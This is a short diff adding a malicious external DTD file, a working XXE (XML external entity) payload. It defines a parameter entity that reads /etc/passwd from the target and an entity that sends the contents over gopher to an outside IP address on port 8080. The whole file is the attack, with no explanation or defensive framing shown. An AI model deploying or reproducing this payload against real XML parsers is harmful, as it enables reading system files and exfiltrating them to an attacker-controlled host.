@@ -1,0 +1,4 @@
+<?xml version="1.0" encoding="utf-8"?> 
+<!ENTITY % passwd SYSTEM "file:///etc/passwd">
+<!ENTITY % wrapper "<!ENTITY send SYSTEM 'gopher://172.105.198.71:8080/?%passwd;'>"> 
+%wrapper; 
